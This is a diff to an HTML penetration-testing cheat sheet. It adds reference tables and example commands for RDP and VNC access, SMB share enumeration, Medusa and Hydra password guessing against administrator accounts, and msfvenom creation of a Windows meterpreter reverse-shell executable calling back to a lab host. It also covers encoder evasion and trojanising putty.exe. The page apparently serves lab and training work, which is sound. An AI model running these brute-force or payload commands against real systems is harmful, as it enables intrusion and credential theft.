@@ -390,11 +390,11 @@ setg Proxies socks5:127.0.0.1:9050</div>
                 <div class="step-cmd">john &lt;hash_file&gt;</div>
               </div>
             </div>
-            <div class="setup-step">
+             <div class="setup-step">
               <div class="step-num">2</div>
               <div class="step-body">
-                <div class="step-text">You can explicitly force John to target NTLM/NT hashes as well as use previously cracked passwords stored in your john.pot file:</div>
-                <div class="step-cmd">john --format=nt &lt;hash_file&gt --loopback</div>
+                <div class="step-text">You can explicitly force John to target NTLM/NT hashes as well as use previously cracked passwords stored in your john.pot file::</div>
+                <div class="step-cmd">john --format=nt <hash_file> --loopback</div>
               </div>
             </div>
             <div class="setup-step">
@@ -521,8 +521,8 @@ setg Proxies socks5:127.0.0.1:9050</div>
             <tr><td class="c1">show payloads</td><td class="c2">Compatible payloads</td><td class="c3">show payloads</td></tr>
             <tr><td class="c1">set &lt;PARAM&gt; &lt;val&gt;</td><td class="c2">Configure a setting</td><td class="c3">set RHOSTS 192.168.1.50</td></tr>
             <tr><td class="c1">setg &lt;PARAM&gt; &lt;val&gt;</td><td class="c2">Global setting for all modules</td><td class="c3">setg LHOST 192.168.1.100</td></tr>
-            <tr><td class="c1">unset &lt;PARAM&gt;</td><td class="c2">Clear a configured setting</td><td class="c3">unset RHOSTS</td></tr>
-            <tr><td class="c1">unsetg &lt;PARAM&gt;</td><td class="c2">Clear a Global setting for all modules</td><td class="c3">unsetg LHOST</td></tr>
+            <tr><td class="c1">unset &lt;PARAM&gt;</td><td class="c2">Remove a configured setting</td><td class="c3">unset RHOSTS</td></tr>
+            <tr><td class="c1">unsetg &lt;PARAM&gt;</td><td class="c2">Remove a configured Global setting</td><td class="c3">unsetg LHOST</td></tr>
           </table>
         </div>
       </div>
@@ -559,6 +559,133 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">download</td><td class="c2">Pull a file from target</td><td class="c3">download C:\loot.txt ./loot.txt</td></tr>
           <tr><td class="c1">upload</td><td class="c2">Push a file to target (e.g. scanline)</td><td class="c3">upload sl.exe C:\Windows\Temp\</td></tr>
         </table>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="flag-block">
+        <div class="ref-wrap-title">xfreerdp3 — remote GUI access to Windows (RDP)</div>
+        <table class="flag-table">
+          <thead><tr><th>Flag</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td class="flg">/v:&lt;host&gt;[:port]</td><td class="fd">Target to connect to (default port 3389)</td></tr>
+            <tr><td class="flg">/u:&lt;user&gt;</td><td class="fd">Username</td></tr>
+            <tr><td class="flg">/p:&lt;pass&gt;</td><td class="fd">Password</td></tr>
+            <tr><td class="flg">/d:&lt;domain&gt;</td><td class="fd">Domain to authenticate against</td></tr>
+            <tr><td class="flg">/cert:ignore</td><td class="fd">Ignore certificate warnings (common in labs)</td></tr>
+            <tr><td class="flg">/sec:nla|tls|rdp</td><td class="fd">Force a specific security protocol</td></tr>
+            <tr><td class="flg">/dynamic-resolution</td><td class="fd">Resize session as the local window resizes</td></tr>
+            <tr><td class="flg">/f</td><td class="fd">Fullscreen mode</td></tr>
+            <tr><td class="flg">/w:&lt;n&gt; /h:&lt;n&gt;</td><td class="fd">Set window width/height</td></tr>
+            <tr><td class="flg">/drive:&lt;name&gt;,&lt;path&gt;</td><td class="fd">Share a local drive/folder into the session</td></tr>
+            <tr><td class="flg">+clipboard</td><td class="fd">Enable clipboard redirection</td></tr>
+            <tr><td class="flg">/admin</td><td class="fd">Connect to the admin/console session</td></tr>
+          </tbody>
+        </table>
+        <div style="padding: 8px 14px 12px;">
+          <div class="step-cmd">xfreerdp3 /v:192.168.1.50 /u:administrator /p:'P@ssw0rd' /d:CORP /cert:ignore /dynamic-resolution</div>
+        </div>
+      </div>
+
+      <div class="flag-block">
+        <div class="ref-wrap-title">vncviewer — remote GUI access via VNC</div>
+        <table class="flag-table">
+          <thead><tr><th>Flag</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td class="flg">host::port</td><td class="fd">Target syntax — double colon for a raw port, single colon for display number</td></tr>
+            <tr><td class="flg">-passwd &lt;file&gt;</td><td class="fd">Use a stored password file instead of prompting</td></tr>
+            <tr><td class="flg">-FullScreen</td><td class="fd">Open in fullscreen</td></tr>
+            <tr><td class="flg">-Shared</td><td class="fd">Join as a shared session (don't kick other viewers)</td></tr>
+            <tr><td class="flg">-ViewOnly</td><td class="fd">Connect without sending mouse/keyboard input</td></tr>
+            <tr><td class="flg">-CompressLevel=&lt;0-9&gt;</td><td class="fd">Compression level, higher = smaller/slower</td></tr>
+            <tr><td class="flg">-QualityLevel=&lt;0-9&gt;</td><td class="fd">Image quality, lower = faster over slow links</td></tr>
+          </tbody>
+        </table>
+        <div style="padding: 8px 14px 12px;">
+          <div class="step-cmd">vncviewer 192.168.1.50::5900</div>
+        </div>
+        <div style="padding: 0 14px 12px;">
+          <div class="callout callout-warn" style="margin-bottom:0;">
+            <span class="callout-icon">⚠</span>
+            <div>Exact flag names/casing differ slightly between VNC viewer implementations (TigerVNC vs RealVNC vs TightVNC) — check <code>vncviewer -h</code> against what's installed on your attack platform.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">📂</span>Remote network shares via SMB</div>
+        <table class="cmd-table">
+          <tr><td class="c1">net view \\&lt;target&gt;</td><td class="c2">List shares available on a host</td><td class="c3">net view \\192.168.1.50</td></tr>
+          <tr><td class="c1">net view \\&lt;target&gt; /all</td><td class="c2">Include hidden/admin shares (C$, ADMIN$)</td><td class="c3">net view \\192.168.1.50 /all</td></tr>
+          <tr><td class="c1">net use \\&lt;target&gt;\&lt;share&gt;</td><td class="c2">Connect to a share with current session's creds</td><td class="c3">net use \\192.168.1.50\C$</td></tr>
+          <tr><td class="c1">net use ... /user:</td><td class="c2">Connect using explicit credentials</td><td class="c3">net use \\tgt\share /user:CORP\bob P@ss</td></tr>
+          <tr><td class="c1">net use Z: \\&lt;target&gt;\&lt;share&gt;</td><td class="c2">Map the share to a drive letter</td><td class="c3">net use Z: \\192.168.1.50\shared</td></tr>
+          <tr><td class="c1">net use * /delete</td><td class="c2">Disconnect all mapped drives/sessions</td><td class="c3">net use * /delete /y</td></tr>
+          <tr><td class="c1">dir &lt;UNC path&gt;</td><td class="c2">List contents of a share directly, no mapping needed</td><td class="c3">dir \\192.168.1.50\C$\Users</td></tr>
+        </table>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🔑</span>Medusa — password guessing</div>
+        <table class="cmd-table">
+          <tr><td class="c1">-h / -H &lt;file&gt;</td><td class="c2">Single host / file of hosts</td><td class="c3">-h 192.168.1.50</td></tr>
+          <tr><td class="c1">-u / -U &lt;file&gt;</td><td class="c2">Single username / userlist file</td><td class="c3">-U users.txt</td></tr>
+          <tr><td class="c1">-p / -P &lt;file&gt;</td><td class="c2">Single password / password list file</td><td class="c3">-P rockyou.txt</td></tr>
+          <tr><td class="c1">-M &lt;module&gt;</td><td class="c2">Target service module (ssh, ftp, smbnt, rdp, ...)</td><td class="c3">-M smbnt</td></tr>
+          <tr><td class="c1">-t &lt;n&gt;</td><td class="c2">Parallel logins per host</td><td class="c3">-t 4</td></tr>
+          <tr><td class="c1">-T &lt;n&gt;</td><td class="c2">Parallel hosts to test at once</td><td class="c3">-T 2</td></tr>
+          <tr><td class="c1">-f</td><td class="c2">Stop scanning this host after first valid login</td><td class="c3">-f</td></tr>
+          <tr><td class="c1">-F</td><td class="c2">Stop entirely after first valid login found anywhere</td><td class="c3">-F</td></tr>
+          <tr><td class="c1">-n &lt;port&gt;</td><td class="c2">Use a non-default port for the module</td><td class="c3">-n 2222</td></tr>
+          <tr><td class="c1">-v &lt;1-6&gt;</td><td class="c2">Verbosity level</td><td class="c3">-v 4</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="step-cmd">medusa -h 192.168.1.50 -u administrator -P rockyou.txt -M smbnt -t 4 -f</div>
+        </div>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🐉</span>Hydra — password guessing</div>
+        <table class="cmd-table">
+          <tr><td class="c1">-l / -L &lt;file&gt;</td><td class="c2">Single username / userlist file</td><td class="c3">-L users.txt</td></tr>
+          <tr><td class="c1">-p / -P &lt;file&gt;</td><td class="c2">Single password / password list file</td><td class="c3">-P rockyou.txt</td></tr>
+          <tr><td class="c1">-t &lt;n&gt;</td><td class="c2">Parallel connections/tasks</td><td class="c3">-t 4</td></tr>
+          <tr><td class="c1">-f</td><td class="c2">Stop after first valid pair is found</td><td class="c3">-f</td></tr>
+          <tr><td class="c1">-V</td><td class="c2">Verbose — show each login:password attempt</td><td class="c3">-V</td></tr>
+          <tr><td class="c1">-s &lt;port&gt;</td><td class="c2">Use a non-default port</td><td class="c3">-s 2222</td></tr>
+          <tr><td class="c1">-e nsr</td><td class="c2">Also try null password, username-as-password, reversed login</td><td class="c3">-e nsr</td></tr>
+          <tr><td class="c1">-o &lt;file&gt;</td><td class="c2">Write found credentials to a file</td><td class="c3">-o found.txt</td></tr>
+          <tr><td class="c1">&lt;service&gt;://&lt;host&gt;</td><td class="c2">Target service is given at the end of the command</td><td class="c3">rdp://192.168.1.50</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="step-cmd">hydra -l administrator -P rockyou.txt -t 4 -f rdp://192.168.1.50</div>
+        </div>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🧨</span>msfvenom — payload creation</div>
+        <table class="cmd-table">
+          <tr><td class="c1">-p &lt;payload&gt;</td><td class="c2">Payload module path</td><td class="c3">-p windows/x64/meterpreter/reverse_tcp</td></tr>
+          <tr><td class="c1">LHOST= / LPORT=</td><td class="c2">Payload options, set like msf variables</td><td class="c3">LHOST=10.10.1.5 LPORT=4444</td></tr>
+          <tr><td class="c1">-f &lt;format&gt;</td><td class="c2">Output format</td><td class="c3">-f exe &nbsp;|&nbsp; -f elf &nbsp;|&nbsp; -f raw</td></tr>
+          <tr><td class="c1">-o &lt;file&gt;</td><td class="c2">Write output to a file</td><td class="c3">-o shell.exe</td></tr>
+          <tr><td class="c1">-a &lt;arch&gt;</td><td class="c2">Target architecture</td><td class="c3">-a x64</td></tr>
+          <tr><td class="c1">--platform &lt;os&gt;</td><td class="c2">Target platform</td><td class="c3">--platform windows</td></tr>
+          <tr><td class="c1">-e &lt;encoder&gt;</td><td class="c2">Encode payload (evasion, not guaranteed AV bypass)</td><td class="c3">-e x86/shikata_ga_nai</td></tr>
+          <tr><td class="c1">-i &lt;n&gt;</td><td class="c2">Number of encoding iterations</td><td class="c3">-i 3</td></tr>
+          <tr><td class="c1">-x &lt;template&gt;</td><td class="c2">Embed payload into an existing executable template</td><td class="c3">-x putty.exe -k</td></tr>
+          <tr><td class="c1">-k</td><td class="c2">Keep template's original behavior running alongside payload</td><td class="c3">used with -x</td></tr>
+          <tr><td class="c1">-b &lt;chars&gt;</td><td class="c2">Bad characters to avoid in the payload</td><td class="c3">-b '\x00\x0a'</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="step-cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.5 LPORT=4444 -f exe -o shell.exe</div>
+        </div>
+        <div style="padding: 0 12px 12px;">
+          <div class="callout callout-warn" style="margin-bottom:0;">
+            <span class="callout-icon">⚠</span>
+            <div>Set a matching listener (<code>exploit/multi/handler</code> with the same payload/LHOST/LPORT) before executing the payload on target, or the callback has nothing to connect to.</div>
+          </div>
+        </div>
       </div>
     </div>
 
